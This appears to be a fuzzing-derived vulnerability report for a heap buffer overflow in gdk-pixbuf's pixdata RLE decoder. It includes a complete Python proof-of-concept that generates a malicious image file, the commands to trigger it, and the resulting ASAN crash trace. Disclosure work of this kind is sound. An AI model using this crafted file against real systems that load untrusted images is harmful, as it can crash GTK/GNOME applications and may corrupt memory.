## Bug0: Heap Buffer Overflow via Zero-Length RLE Constant Run in gdk_pixbuf_from_pixdata

The function `gdk_pixbuf_from_pixdata()` in `gdk-pixdata.c` (lines 462–483) lacks a zero-length guard on the RLE constant run counter, allowing a crafted `0x80` length byte to trigger an unsigned integer underflow from 0 to UINT_MAX in the do-while loop and thereby write far beyond the allocated heap output buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
import struct

# GdkPixdata constants (all BIG-ENDIAN)
MAGIC = 0x47646b50  # "GdkP"
PIXDATA_TYPE_RGBA_RLE = 0x02 | 0x010000 | 0x02000000  # 0x02010002

# 1x1 RGBA image
width = 1
height = 1
bpp = 4
rowstride = width * bpp  # = 4

# pixel_data: constant run with 0x80 (length=0 bug)
pixel_data = bytes([
    0x80,        # constant run, length = 0x80 - 128 = 0 (TRIGGERS BUG)
    0xFF, 0x00, 0x00, 0xFF,  # RGBA pixel: red
])

total_length = 24 + len(pixel_data)  # header + pixel_data

# Pack header in big-endian
header = struct.pack(">IIIIII",
    MAGIC,                    # magic
    total_length,             # length (total stream size)
    PIXDATA_TYPE_RGBA_RLE,    # pixdata_type
    rowstride,                # rowstride
    width,                    # width
    height,                   # height
)

data = header + pixel_data
with open("poc_input.gdkp", "wb") as f:
    f.write(data)
print(f"Generated poc_input.gdkp ({len(data)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000d14 at pc 0x7efe3935b029 bp 0x7ffce70260c0 sp 0x7ffce70260b0
WRITE of size 4 at 0x502000000d14 thread T0
    #0 0x7efe3935b028 in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xad028)
    #1 0x7efe393754fb in try_load (libgdk_pixbuf-2.0.so.0+0xc74fb)
0x502000000d14 is located 0 bytes to the right of 4-byte region [0x502000000d10,0x502000000d14)

### Impact

An attacker who supplies a crafted GdkPixdata file can cause a heap buffer overflow write in `gdk_pixbuf_from_pixdata()`, corrupting adjacent heap metadata or object fields and potentially enabling arbitrary code execution on 32-bit systems where heap pointer wraparound allows full heap overwrite. Any application that loads untrusted image files via gdk-pixbuf is exposed through this attack surface, including GNOME desktop components, image viewers, and any GTK application that renders user-supplied images. On 64-bit systems the runaway write causes an immediate crash, providing a reliable denial-of-service primitive with no mitigating constraints beyond supplying a 29-byte malformed file.
